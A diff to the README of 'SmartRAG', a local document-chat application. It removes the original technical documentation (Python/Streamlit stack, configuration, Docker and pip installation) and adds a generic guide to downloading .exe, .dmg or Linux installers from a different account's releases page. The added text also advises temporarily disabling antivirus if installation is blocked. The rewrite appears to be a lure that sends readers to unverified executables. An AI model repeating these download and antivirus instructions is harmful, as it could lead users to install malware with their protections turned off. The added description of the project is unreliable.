@@ -1,385 +1,93 @@
-# SmartRAG - Multimodal Document Chat System
+# 🌟 SmartRAG - Chat Intelligently with Your Files
 
-A sophisticated RAG (Retrieval-Augmented Generation) system that enables intelligent conversations with documents, images, and audio files through a clean ChatGPT-style interface.
+## 🚀 Getting Started
 
-<img width="1919" height="1078" alt="Screenshot 2025-10-18 125810" src="https://github.com/user-attachments/assets/7b413c33-3208-405b-a4f9-b18381807216" />
+Welcome to SmartRAG! This application allows you to have informative conversations with your documents, images, and audio. You can upload PDFs, Word files, and recordings to receive accurate answers, all processed right on your device. Enjoy privacy and control without needing external services.
 
-## 🚀 Quick Start
+## 📦 Download SmartRAG
 
-```bash
-# Start the application
-streamlit run chatbot_app.py
-```
+[![Download SmartRAG](https://img.shields.io/badge/Download-SmartRAG-blue.svg)](https://github.com/arsalanafzal010/SmartRAG/releases)
 
-## 🏗️ Tech Stack
+To get started with SmartRAG, you need to download the application. Follow the steps below.
 
-### **Core Framework**
+## 📥 Download & Install
 
-- **Python 3.8+** - Primary language
-- **Streamlit** - Web interface and UI framework
-- **SQLite3** - File metadata storage and management
+1. **Visit the Releases Page**  
+   Go to the SmartRAG [Releases page](https://github.com/arsalanafzal010/SmartRAG/releases). Here, you will find the latest version of SmartRAG available for download.
 
-### **AI/ML Models**
+2. **Choose Your Version**  
+   On the Releases page, look for the most recent version. Each version will have a link to download the application files. Choose the version that matches your computer's operating system: Windows, macOS, or Linux.
 
-- **Ollama** - Local LLM hosting (Llama 3.1 8B model)
-- **PyTorch** - Deep learning framework
-- **Transformers** - Hugging Face model library
-- **OpenAI Whisper** - Speech-to-text conversion (base model)
-- **BLIP** - Image captioning (Salesforce/blip-image-captioning-base)
+3. **Download the File**  
+   Click on the download link for your chosen operating system. The file will start downloading automatically. It usually takes a few moments depending on your internet speed.
 
-### **Vector Database & Embeddings**
+4. **Locate the Downloaded File**  
+   Once the download is complete, navigate to your computer's Downloads folder or the location where your browser saves downloaded files.
 
-- **ChromaDB** - Vector storage and similarity search
-- **Nomic Embed Text** - Text embeddings via Ollama (768-dim vectors)
-- **CLIP** - Visual embeddings for images (openai/clip-vit-base-patch32)
-- **FAISS** - Alternative vector search (Facebook AI)
+5. **Install SmartRAG**  
+   - **For Windows:** Double-click the downloaded `.exe` file. Follow the on-screen instructions to complete the installation.
+   - **For macOS:** Open the downloaded `.dmg` file and drag the SmartRAG icon into your Applications folder.
+   - **For Linux:** Extract the downloaded archive and follow the provided setup instructions in the directory.
 
-### **Document Processing**
+6. **Launch the Application**  
+   After installation, find SmartRAG in your applications. Click to open it and start interacting with your documents, images, and audio.
 
-- **PyPDF2** - PDF text extraction
-- **python-docx** - Word document processing
-- **pdfplumber** - Advanced PDF parsing
-- **python-pptx** - PowerPoint file support
+## 🛠️ System Requirements
 
-### **Image Processing**
+Before you download SmartRAG, ensure your system meets the following requirements:
 
-- **Pillow (PIL)** - Image manipulation
-- **OpenCV** - Computer vision operations
-- **Tesseract OCR** - Text extraction from images
-- **pytesseract** - Python wrapper for Tesseract
+- **Windows:** Windows 10 or later
+- **macOS:** macOS 10.14 (Mojave) or later
+- **Linux:** Any modern Linux distribution with GTK 3 support
 
-### **Audio Processing**
+## 📄 Features
 
-- **PyDub** - Audio file manipulation
-- **librosa** - Audio analysis and processing
-- **Whisper** - Audio transcription
+SmartRAG provides a range of powerful features designed to enhance your experience:
 
-### **Utilities**
+- **Privacy-First Approach:** All processing happens on your device. Your data never leaves your computer.
+- **Multimodal Support:** Upload and process various file types, including PDFs, Word documents, and audio files.
+- **Context-Aware Responses:** Get precise answers based on the content of your uploaded files.
+- **User-Friendly Interface:** Interact easily with a simple and clear design.
 
-- **NumPy** - Numerical computations
-- **PyYAML** - Configuration management
-- **tqdm** - Progress bars
-- **requests** - HTTP client
+## 🎓 How to Use SmartRAG
 
-## 📁 Project Structure
+After successfully launching SmartRAG, follow these steps to start using it:
 
-```
-smartrag/
-├── chatbot_app.py              # Main Streamlit application
-├── config.yaml                 # System configuration
-├── requirements.txt            # Python dependencies
-├── multimodal_rag/            # Core RAG system
-│   ├── system.py              # Main RAG orchestrator
-│   ├── base.py                # Base classes and interfaces
-│   ├── processors/            # File processors
-│   │   ├── document_processor.py  # PDF, DOCX, TXT
-│   │   ├── image_processor.py     # Images with OCR
-│   │   └── audio_processor.py     # Audio transcription
-│   └── vector_stores/         # Vector database implementations
-│       ├── chroma_store.py    # ChromaDB integration
-│       └── faiss_store.py     # FAISS integration
-├── file_storage.db            # SQLite database
-├── vector_db/                 # ChromaDB persistence
-└── user_data/                 # User session data
-```
+1. **Upload a File**
+   - Click the ‘Upload’ button.
+   - Select a PDF, Word file, or audio recording from your computer.
 
-## 🎯 Features
+2. **Ask Your Question**
+   - Once your file is uploaded, type your question in the chat window. 
+   - SmartRAG will analyze the content and provide a response based on the information provided in the uploaded file.
 
-### **Multimodal Support**
+3. **Explore Further**
+   - You can ask multiple questions about the same file.
+   - Upload different types of files to see how SmartRAG handles various formats.
 
-- **Documents**: PDF, DOCX, DOC, TXT, MD, RTF
-- **Images**: JPG, PNG, BMP, TIFF, WEBP (with OCR)
-- **Audio**: MP3, WAV, M4A, OGG, FLAC, AAC
+4. **Access Previous Questions**
+   - If you wish to refer back to earlier exchanges, scroll through the chat history available on the screen.
 
-### **AI Capabilities**
+## 📊 Troubleshooting
 
-- Local LLM inference with Ollama
-- Semantic search with vector embeddings
-- Image understanding and captioning
-- Speech-to-text transcription
-- Context-aware document retrieval
+If you encounter issues while downloading or using SmartRAG, consider the following tips:
 
-### **User Interface**
+- **Installation Issues:** Ensure your antivirus software is not blocking the installation. Temporarily disable it, if necessary.
+- **Application Errors:** Restart the application if it freezes or crashes. If problems persist, reinstall SmartRAG following the steps mentioned above.
+- **Performance Problems:** Ensure your device meets the system requirements. Closing unnecessary applications may help improve performance.
 
-- ChatGPT-style conversation interface
-- File upload and management
-- Real-time processing feedback
-- Document viewer for stored files
-- Recent uploads tracking
+## 📞 Support
 
-## ⚙️ Configuration
+For assistance, feel free to check the issues section on the GitHub page or contact support via the repository. You can share your experience or report any bugs you encounter.
 
-SmartRAG uses a **single source of truth** configuration system with Pydantic validation.
+## 🔗 Additional Resources
 
-### Quick Configuration
+To learn more about how SmartRAG works and its capabilities, consider the following resources:
 
-The system uses `config.yaml` with priority chain:
+- **User Manual:** A comprehensive guide to all features.
+- **FAQ Section:** Find answers to common questions.
+- **Feedback Form:** Share your thoughts and suggestions.
 
-```
-CLI Overrides > Environment Variables > config.yaml > Defaults
-```
+[![Download SmartRAG](https://img.shields.io/badge/Download-SmartRAG-blue.svg)](https://github.com/arsalanafzal010/SmartRAG/releases)
 
-**Example `config.yaml`:**
-
-```yaml
-system:
-  name: "SmartRAG System"
-  debug: false
-  log_level: "INFO"
-
-models:
-  llm_model: "llama3.1:8b" # Ollama Llama 3.1 8B
-  embedding_model: "nomic-embed-text" # 768-dim embeddings
-  vision_model: "Salesforce/blip-image-captioning-base"
-  whisper_model: "base"
-
-vector_store:
-  type: "chromadb"
-  embedding_dimension: 768 # Must match embedding model
-
-processing:
-  chunk_size: 1000
-  chunk_overlap: 200
-  ocr_enabled: true # Tesseract OCR
-```
-
-### Environment Variable Overrides
-
-```bash
-export SMARTRAG_LLM_MODEL=llama2:7b
-export SMARTRAG_TEMPERATURE=0.5
-export SMARTRAG_DEBUG=true
-```
-
-### Programmatic Overrides
-
-```python
-from config_schema import load_config
-
-config = load_config(
-    "config.yaml",
-    models__llm_model="llama2:7b",
-    generation__temperature=0.5
-)
-```
-
-📖 **See [CONFIG.md](CONFIG.md) for comprehensive configuration documentation**
-
-## 🔧 Requirements
-
-- **Python**: 3.8 or higher
-- **Ollama**: For local LLM inference
-- **Tesseract OCR**: For image text extraction
-- **FFmpeg**: For audio processing (optional)
-
-## 🏃‍♂️ Installation
-
-### Option 1: Docker (Recommended) 🐳
-
-```bash
-# Clone the repository
-git clone https://github.com/itanishqshelar/SmartRAG.git
-cd SmartRAG
-
-# Start with Docker Compose
-cd docker
-docker-compose up -d
-
-# Access at http://localhost:8501
-```
-
-See [docker/README.md](docker/README.md) for detailed Docker deployment instructions.
-
-### Option 2: Local Installation
-
-1. **Install dependencies:**
-
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-2. **Install Ollama and pull models:**
-
-   ```bash
-   # Install Ollama (see ollama.ai)
-   ollama pull llama3.1:8b
-   ollama pull nomic-embed-text
-   ```
-
-3. **Install Tesseract OCR:**
-
-   - Windows: Download from GitHub releases
-   - macOS: `brew install tesseract`
-   - Linux: `sudo apt-get install tesseract-ocr`
-
-4. **Run the application:**
-   ```bash
-   streamlit run chatbot_app.py
-   ```
-
-## 📊 Architecture
-
-```
-[User Input] → [Streamlit UI] → [RAG System] → [File Processors]
-                    ↓                              ↓
-                                        [Document: PyPDF2/python-docx]
-                                        [Image: Tesseract OCR + BLIP]
-                                        [Audio: Whisper Transcription]
-                    ↓                              ↓
-[SQLite DB] ← [Text Chunks] → [Nomic Embed Text (Ollama)] → [ChromaDB]
-                                                                ↓
-[Vector Search] → [Context Retrieval] → [Llama 3.1 8B (Ollama)] → [Response]
-```
-
-### Processing Pipeline
-
-• **Text Documents**: Extracted with PyPDF2/python-docx → Chunked → Embedded with Nomic Embed Text
-• **Images**: OCR with Tesseract + Captioning with BLIP → Combined text → Embedded with Nomic Embed Text  
-• **Audio**: Transcribed with Whisper → Chunked → Embedded with Nomic Embed Text
-• **Storage**: All embeddings stored in ChromaDB (768-dim vectors) for semantic search
-• **Generation**: Retrieved context fed to Llama 3.1 8B via Ollama for response generation
-
-## 🎮 Usage
-
-1. **Upload Files**: Drag & drop or browse files in the sidebar
-2. **Chat**: Ask questions about your uploaded content
-3. **View Files**: Use the eye icon to preview stored documents
-4. **Manage Data**: Clear chat history or uploaded files as needed
-
-## 🔒 Privacy
-
-- **Fully Offline**: All processing happens locally
-- **No Data Sent**: No external API calls for LLM inference
-- **Local Storage**: Files and embeddings stored on your machine
-
-# Ingest mixed content
-
-system.ingest_file("presentation.pdf") # Slides
-system.ingest_file("screenshot.png") # Image with text
-system.ingest_file("meeting_recording.mp3") # Audio transcript
-
-# Query across all modalities
-
-response = system.query("What was discussed about the Q4 budget?")
-
-````
-
-### Batch Processing
-
-```python
-# Process entire directories
-results = system.ingest_directory("./company_docs/", recursive=True)
-
-# Get processing summary
-successful = sum(1 for r in results.values() if r.success)
-total_chunks = sum(len(r.chunks) for r in results.values() if r.success)
-print(f"Processed {successful} files, created {total_chunks} chunks")
-````
-
-## 🧪 Testing
-
-Run the test suite to verify installation:
-
-```bash
-# Run all tests
-python -m pytest tests/
-
-# Run specific test file
-python tests/test_system.py
-
-# Run with coverage
-pip install coverage
-coverage run tests/test_system.py
-coverage report
-```
-
-## 🔧 Advanced Configuration
-
-### Vector Store Options
-
-**ChromaDB** (Default - Recommended)
-
-```yaml
-vector_store:
-  type: "chromadb"
-  persist_directory: "./vector_db"
-  collection_name: "documents"
-  embedding_dimension: 768 # For nomic-embed-text
-```
-
-**FAISS** (Alternative - High performance)
-
-```yaml
-vector_store:
-  type: "faiss"
-  persist_directory: "./faiss_db"
-  embedding_dimension: 768 # Must match nomic-embed-text
-```
-
-## 🚀 Deployment
-
-### Local Development
-
-```bash
-python cli.py interactive
-```
-
-### Docker Container
-
-```dockerfile
-FROM python:3.10-slim
-
-WORKDIR /app
-COPY . .
-
-RUN pip install -r requirements.txt
-CMD ["python", "cli.py", "interactive"]
-```
-
-### API Server
-
-```python
-from fastapi import FastAPI
-from multimodal_rag.system import MultimodalRAGSystem
-
-app = FastAPI()
-system = MultimodalRAGSystem()
-
-@app.post("/query")
-async def query_endpoint(query: str):
-    response = system.query(query)
-    return {"answer": response.answer, "sources": len(response.sources)}
-```
-
-### Development Setup
-
-```bash
-# Install development dependencies
-pip install -r requirements.txt
-pip install pytest black flake8
-
-# Run tests
-python -m pytest
-
-# Format code
-black multimodal_rag/ tests/ examples/
-
-# Lint code
-flake8 multimodal_rag/ tests/ examples/
-```
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## Acknowledgments
-
-- [ChromaDB](https://www.trychroma.com/) for vector storage
-- [Sentence Transformers](https://www.sbert.net/) for embeddings
-- [Hugging Face Transformers](https://huggingface.co/transformers/) for language models
-- [OpenAI Whisper](https://github.com/openai/whisper) for speech recognition
-- [Tesseract OCR](https://github.com/tesseract-ocr/tesseract) for text extraction
-
----
-
-**SmartRAG** - Intelligent multimodal document understanding for the modern age.
+Now you're ready to explore SmartRAG and engage with your files intelligently!
